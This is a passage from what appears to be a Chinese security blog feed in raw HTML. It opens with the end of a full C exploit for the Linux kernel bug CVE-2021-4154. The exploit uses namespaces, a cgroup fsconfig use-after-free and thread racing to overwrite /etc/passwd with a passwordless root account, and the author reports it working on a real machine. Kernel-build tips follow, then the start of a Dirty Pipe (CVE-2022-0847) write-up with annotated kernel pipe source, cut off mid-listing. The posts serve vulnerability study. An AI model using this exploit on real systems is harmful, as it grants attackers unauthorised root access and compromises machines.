class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kcmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;crypt.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FILE_NUM 1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_NUM 0x40000</span><br><br><span class="hljs-type">int</span> tmp_fd, uaf_fd, fscontext_fd, victim_fd;<br><span class="hljs-type">int</span> target_fd[FILE_NUM];<br><span class="hljs-type">pid_t</span> fork_fd;<br><span class="hljs-type">pthread_t</span> large_write_thread, passwd_write_thread;<br><span class="hljs-type">int</span> flag = <span class="hljs-number">0</span>, large_write_flag = <span class="hljs-number">0</span>, passwd_write_flag;<br><span class="hljs-type">size_t</span> start_addr = <span class="hljs-number">0x114514000</span>;<br><span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_namespace</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buff[<span class="hljs-number">0x100</span>];<br><br>    <span class="hljs-type">uid_t</span> uid = getuid();<br>    <span class="hljs-type">gid_t</span> gid = getgid();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] init namespace&quot;</span>);<br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWUSER | CLONE_NEWNS)) &#123;<br>        err_exit(<span class="hljs-string">&quot;unshare(CLONE_NEWUSER | CLONE_NEWNS)&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNET)) &#123;<br>        err_exit(<span class="hljs-string">&quot;unshare(CLONE_NEWNET)&quot;</span>);<br>    &#125;<br><br>    fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(buff, <span class="hljs-keyword">sizeof</span>(buff), <span class="hljs-string">&quot;deny&quot;</span>);<br>    write(fd, buff, <span class="hljs-built_in">strlen</span>(buff));<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(buff, <span class="hljs-keyword">sizeof</span>(buff), <span class="hljs-string">&quot;0 %d 1&quot;</span>, uid);<br>    write(fd, buff, <span class="hljs-built_in">strlen</span>(buff));<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(buff, <span class="hljs-keyword">sizeof</span>(buff), <span class="hljs-string">&quot;0 %d 1&quot;</span>, gid);<br>    write(fd, buff, <span class="hljs-built_in">strlen</span>(buff));<br>    close(fd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_dir</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] create exp_dir&quot;</span>);<br>    system(<span class="hljs-string">&quot;rm -rf exp_dir&quot;</span>);<br>    system(<span class="hljs-string">&quot;mkdir exp_dir&quot;</span>);<br>    system(<span class="hljs-string">&quot;touch exp_dir/data&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod -R 777 exp_dir/&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_uaf</span><span class="hljs-params">()</span><br>&#123;   <br>    system(<span class="hljs-string">&quot;cd exp_dir&quot;</span>);<br>    system(<span class="hljs-string">&quot;ln -s data exp_dir/uaf&quot;</span>);<br>    system(<span class="hljs-string">&quot;cd ../&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] prepare create uaf&quot;</span>);<br>    fscontext_fd = syscall(__NR_fsopen, <span class="hljs-string">&quot;cgroup&quot;</span>, FSOPEN_CLOEXEC);<br>    <span class="hljs-keyword">if</span> (fscontext_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;fsopen failed!&quot;</span>);<br><br>    uaf_fd = open(<span class="hljs-string">&quot;exp_dir/uaf&quot;</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (uaf_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open uaf failed!&quot;</span>);<br>    <br>    syscall(__NR_fsconfig, fscontext_fd, FSCONFIG_SET_FD, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-literal">NULL</span>, uaf_fd);<br>    close(fscontext_fd);<br>&#125;<br><br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">large_write</span><span class="hljs-params">()</span><br>&#123;<br>    tmp_fd = open(<span class="hljs-string">&quot;exp_dir/uaf&quot;</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (tmp_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open tmp failed!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] mmap 1G size data&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PAGE_NUM; i++)<br>    &#123;<br>        <span class="hljs-type">void</span> * ret = mmap((<span class="hljs-type">void</span>*)start_addr + <span class="hljs-number">0x1000</span>*i , <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!ret)<br>            err_exit(<span class="hljs-string">&quot;mmap failed!&quot;</span>);<br>    &#125;<br>    <br>    large_write_flag = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (write(tmp_fd, start_addr, <span class="hljs-number">0x1000</span>*(PAGE_NUM<span class="hljs-number">-1</span>)) &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;large write failed!&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] large write success!&quot;</span>);<br>    close(tmp_fd);<br>&#125;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">passwd_write</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> passwd[<span class="hljs-number">1024</span>] = <span class="hljs-string">&quot;shell::0:0:root:/root:/bin/bash\n&quot;</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] try to overwrite /etc/passwd&quot;</span>);<br>    <span class="hljs-keyword">while</span> (!large_write_flag) &#123;&#125;<br><br>    passwd_write_flag = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (write(uaf_fd, passwd, <span class="hljs-built_in">strlen</span>(passwd)) &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;overwrite /etc/passwd failed!&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] overwrite /etc/passwd success&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">file_struct_spray</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (!passwd_write_flag) &#123;&#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] start try to hit uaf file struct&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; FILE_NUM; i++)<br>    &#123;<br>        target_fd[i] = open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br>        <span class="hljs-keyword">if</span> (target_fd[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;failed at %d target file\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;failed!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, target_fd[i]) == <span class="hljs-number">0</span>)<br>        &#123;<br>            victim_fd = target_fd[i];<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] victim_fd is %d\n&quot;</span>, victim_fd);<br>            flag = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++)<br>                close(target_fd[i]);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!flag)<br>        err_exit(<span class="hljs-string">&quot;failed to find victim_fd&quot;</span>);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[], <span class="hljs-type">char</span> * envp[])</span><br>&#123;   <br><br>    init_namespace();<br>    create_dir();<br>    <br>    create_uaf();<br><br>    pthread_create(&amp;large_write_thread, <span class="hljs-literal">NULL</span>, large_write, <span class="hljs-literal">NULL</span>);<br>    usleep(<span class="hljs-number">1</span>);<br>    pthread_create(&amp;passwd_write_thread, <span class="hljs-literal">NULL</span>, passwd_write, <span class="hljs-literal">NULL</span>);<br><br>    file_struct_spray();<br><br>    pthread_exit(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终在真机中的运行效果</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240405192649.png"></p><p><del>不用泄露地址，真的就像🐍出来一样爽啊</del></p><h1 id="some-thricks"><a href="#some-thricks" class="headerlink" title="some thricks"></a>some thricks</h1><p>虽然笔者在上一篇文章中提了一种比较方便的替换复现环境内核的方法，但是吧，还是会遇到许多问题。</p><p>就像笔者这次试了5.4和5.8的五六个generic版本，要么就是patch了CVE，要么就是不能稳定运行（大概十次只能成功一次，而且有时候覆写的data一变就8行了）所以笔者还是回归了最原始的方法，直接本地编译一个替换</p><p>先把源码放到&#x2F;usr&#x2F;src下，解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> ~/linux-5.8.tar.gz /usr/src<br><span class="hljs-built_in">cd</span> /usr/src<br>tar -xf ./linux-5.8.tar.gz<br><span class="hljs-built_in">cd</span> ./linux-5.8<br></code></pre></td></tr></table></figure><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make menuconfig<span class="hljs-comment">#默认选项，直接退出就行</span><br>make all -j8    <span class="hljs-comment">#时间可能会比较长</span><br></code></pre></td></tr></table></figure><p>编译模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make INSTALL_MOD_STRIP=1 modules_install <span class="hljs-comment">#也可以不加INSTALL_MOD_STRIP=1，但是鼠鼠不能保证启动地时候加载600多MB的inid不会卡死呦😋</span><br>make install<br></code></pre></td></tr></table></figure><p>更新gurb并重启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">update-grub<br>reboot<br></code></pre></td></tr></table></figure><p>然后就是进入高级模式选择5.8版本的内核启动啦</p><h1 id="0xff：写在最后的最后"><a href="#0xff：写在最后的最后" class="headerlink" title="0xff：写在最后的最后"></a>0xff：写在最后的最后</h1><p>笔者为了图省事，在最后用了<code>dirtycred</code>完成了提权</p><p>但是作为一个21年的CVE，原本的exp其实采用了<strong>CROSS-CACHE OVERFLOW</strong>这一手法完成利用</p><p>主要是铸币笔者实在不是很用的明白<strong>CROSS-CHACHE OVERFLOW</strong>，所以直接逃课了😋</p><p>但估计接下来笔者会写个专题专门练练👊👊👊</p><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><p><a href="https://blingblingxuanxuan.github.io/2023/05/19/230518-cve-2021-4154">https://blingblingxuanxuan.github.io/2023/05/19/230518-cve-2021-4154</a></p><p><a href="https://zhuanlan.zhihu.com/p/93592262">新一代mount系统调用(1)——接口初探 - 知乎 (zhihu.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-0847（Dirty Pipe) Remake</title>
    <link href="/2024/03/18/dirtypipe/"/>
    <url>/2024/03/18/dirtypipe/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00：写在一切之前"><a href="#0x00：写在一切之前" class="headerlink" title="0x00：写在一切之前"></a>0x00：写在一切之前</h1><p><strong>Dirty</strong>系列第二弹</p><p>因为该漏洞发现在对管道写入数据后，读取完毕后未清空<code>pipe_buffer-&gt;flags</code>，造成越权写入只读文件</p><p>和<strong>Dirty Cow</strong>很像，因此被冠以<strong>Dirty Pipe</strong>的称呼</p><p>但是和<strong>Dirty Cow</strong>需要线程竞争相比，<strong>Dirty Pipe</strong>稳定许多</p><p>PS：下文所有源码的版本为 5.8</p><h1 id="0x01：信息收集"><a href="#0x01：信息收集" class="headerlink" title="0x01：信息收集"></a>0x01：信息收集</h1><p><a href="https://nvd.nist.gov/vuln/detail/cve-2022-0847">NVD - cve-2022-0847 (nist.gov)</a></p><p>影响版本：</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321231636.png"></p><h1 id="0x02：前置知识"><a href="#0x02：前置知识" class="headerlink" title="0x02：前置知识"></a>0x02：前置知识</h1><h2 id="何为导管🤔"><a href="#何为导管🤔" class="headerlink" title="何为导管🤔"></a>何为导管🤔</h2><p>何为管道？好问题，所谓管道，就是连接一个写进程与一个读进程，用于两进程间通信的共享文件，又称<code>pipe</code>文件</p><p>向管道（共享文件）提供输入的发送进程（即写进程），以字符流形式将大量的数据送入管道；而接收管道输出的接收进程（即读进程），可从管道中接收数据。由于发送进程和接收进程是利用管道进行通信的，故又称管道通信。</p><p>为了协调双方的通信，管道通信机制必须提供以下3 方面的协调能力。</p><ul><li>互斥。当一个进程正在对 <code>pipe</code> 进行读&#x2F;写操作时，另一个进程必须等待。</li><li>同步。当写（输入）进程把一定数量（如4KB）数据写入 pipe 后，便去睡眠等待，直到读（输出）进程取走数据后，再把它唤醒。当读进程读到一空 <code>pipe</code> 时，也应睡眠等待，直至写进程将数据写入管道后，才将它唤醒。</li><li>对方是否存在。只有确定对方已存在时，才能进行通信。</li></ul><h2 id="pipe-の-调用链"><a href="#pipe-の-调用链" class="headerlink" title="pipe の 调用链"></a>pipe の 调用链</h2><p>接下来就来看看<code>pipe</code>的实现过程</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">do_pipe2<br>__do_pipe_flags<br>create_pipe_files<br>get_pipe_inode<br>alloc_pipe_info<br></code></pre></td></tr></table></figure><h3 id="do-pipe2"><a href="#do-pipe2" class="headerlink" title="do_pipe2"></a>do_pipe2</h3><p><code>pipe</code>和<code>pipe2</code>都是系统调用，都是<code>do_pipe2</code>的套娃，不同的是，<code>pipe2</code>能自己指定<code>flags</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C">SYSCALL_DEFINE2(pipe2, <span class="hljs-type">int</span> __user *, fildes, <span class="hljs-type">int</span>, flags)<br>&#123;<br><span class="hljs-keyword">return</span> do_pipe2(fildes, flags);<br>&#125;<br><br>SYSCALL_DEFINE1(pipe, <span class="hljs-type">int</span> __user *, fildes)<br>&#123;<br><span class="hljs-keyword">return</span> do_pipe2(fildes, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sys_pipe() is the normal C calling standard for creating</span><br><span class="hljs-comment"> * a pipe. It&#x27;s not the way Unix traditionally does this, though.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//fildes 是一个指向整数数组的指针，用于存储管道端点的文件描述符</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_pipe2</span><span class="hljs-params">(<span class="hljs-type">int</span> __user *fildes, <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">files</span>[2];</span><br><span class="hljs-type">int</span> fd[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> error;<br><span class="hljs-comment">//核心函数：这个函数预计会创建一个管道，并返回相应的文件描述符和文件指针数组。如果调用成功，返回值为0</span><br>error = __do_pipe_flags(fd, files, flags);<br><span class="hljs-keyword">if</span> (!error) &#123;<br><span class="hljs-keyword">if</span> (unlikely(copy_to_user(fildes, fd, <span class="hljs-keyword">sizeof</span>(fd)))) &#123;<br>fput(files[<span class="hljs-number">0</span>]);<br>fput(files[<span class="hljs-number">1</span>]);<br>put_unused_fd(fd[<span class="hljs-number">0</span>]);<br>put_unused_fd(fd[<span class="hljs-number">1</span>]);<br>error = -EFAULT;<br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//copy_to_user 成功，那么它将通过 fd_install 将文件描述符安装到内核中，以便用户空间可以通过这些文件描述符访问管道。</span><br>fd_install(fd[<span class="hljs-number">0</span>], files[<span class="hljs-number">0</span>]);<br>fd_install(fd[<span class="hljs-number">1</span>], files[<span class="hljs-number">1</span>]);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do-pipe-flags"><a href="#do-pipe-flags" class="headerlink" title="__do_pipe_flags"></a>__do_pipe_flags</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __do_pipe_flags(<span class="hljs-type">int</span> *fd, <span class="hljs-keyword">struct</span> file **files, <span class="hljs-type">int</span> flags)<br>&#123;<br><span class="hljs-type">int</span> error;<br><span class="hljs-type">int</span> fdw, fdr;<br><br><span class="hljs-keyword">if</span> (flags &amp; ~(O_CLOEXEC | O_NONBLOCK | O_DIRECT | O_NOTIFICATION_PIPE))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>error = create_pipe_files(files, flags);<span class="hljs-comment">//核心函数：来创建管道的文件对象</span><br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">return</span> error;<br><br>    <span class="hljs-comment">//两次来获取未使用的文件描述符。如果获取失败，则跳转到错误处理部分。</span><br>error = get_unused_fd_flags(flags);<br><span class="hljs-keyword">if</span> (error &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_read_pipe;<br>fdr = error;<br><br>error = get_unused_fd_flags(flags);<br><span class="hljs-keyword">if</span> (error &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fdr;<br>fdw = error;<br><br>audit_fd_pair(fdr, fdw);<span class="hljs-comment">//记录文件描述符的配对情况</span><br>fd[<span class="hljs-number">0</span>] = fdr;<br>fd[<span class="hljs-number">1</span>] = fdw;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br> err_fdr:<br>put_unused_fd(fdr);<br> err_read_pipe:<br>fput(files[<span class="hljs-number">0</span>]);<br>fput(files[<span class="hljs-number">1</span>]);<br><span class="hljs-keyword">return</span> error;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="create-pipe-files"><a href="#create-pipe-files" class="headerlink" title="create_pipe_files"></a>create_pipe_files</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">create_pipe_files</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file **res, <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> get_pipe_inode();<span class="hljs-comment">//获取一个用于管道的 inode 对象</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">f</span>;</span><br><br><span class="hljs-keyword">if</span> (!inode)<br><span class="hljs-keyword">return</span> -ENFILE;<br><br><span class="hljs-keyword">if</span> (flags &amp; O_NOTIFICATION_PIPE) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">if</span> (watch_queue_init(inode-&gt;i_pipe) &lt; <span class="hljs-number">0</span>) &#123;<br>iput(inode);<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">return</span> -ENOPKG;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br><span class="hljs-comment">//函数创建一个伪文件对象，该文件对象连接到之前获取的管道 inode 上。它将根据传入的标志设置文件的读写属性，并将其与管道的操作函数 pipefifo_fops 关联起来。如果创建失败，会释放之前分配的管道信息并释放 inode，然后返回相应的错误代码。</span><br>f = alloc_file_pseudo(inode, pipe_mnt, <span class="hljs-string">&quot;&quot;</span>,<br>O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),<br>&amp;pipefifo_fops);<br><span class="hljs-keyword">if</span> (IS_ERR(f)) &#123;<br>free_pipe_info(inode-&gt;i_pipe);<br>iput(inode);<br><span class="hljs-keyword">return</span> PTR_ERR(f);<br>&#125;<br><span class="hljs-comment">//对创建的写入端文件对象设置私有数据指针指向管道的 inode。</span><br>f-&gt;private_data = inode-&gt;i_pipe;<br><span class="hljs-comment">//调用 alloc_file_clone 函数创建一个克隆的文件对象作为读取端，同时将其与管道的操作函数 pipefifo_fops 关联起来。如果创建失败，会释放之前分配的管道信息、释放写入端文件对象并返回相应的错误代码。</span><br>res[<span class="hljs-number">0</span>] = alloc_file_clone(f, O_RDONLY | (flags &amp; O_NONBLOCK),<br>  &amp;pipefifo_fops);<br><span class="hljs-keyword">if</span> (IS_ERR(res[<span class="hljs-number">0</span>])) &#123;<br>put_pipe_info(inode, inode-&gt;i_pipe);<br>fput(f);<br><span class="hljs-keyword">return</span> PTR_ERR(res[<span class="hljs-number">0</span>]);<br>&#125;<br>res[<span class="hljs-number">0</span>]-&gt;private_data = inode-&gt;i_pipe;<br>res[<span class="hljs-number">1</span>] = f;<br>stream_open(inode, res[<span class="hljs-number">0</span>]);<br>stream_open(inode, res[<span class="hljs-number">1</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="get-pipe-inode"><a href="#get-pipe-inode" class="headerlink" title="get_pipe_inode"></a>get_pipe_inode</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 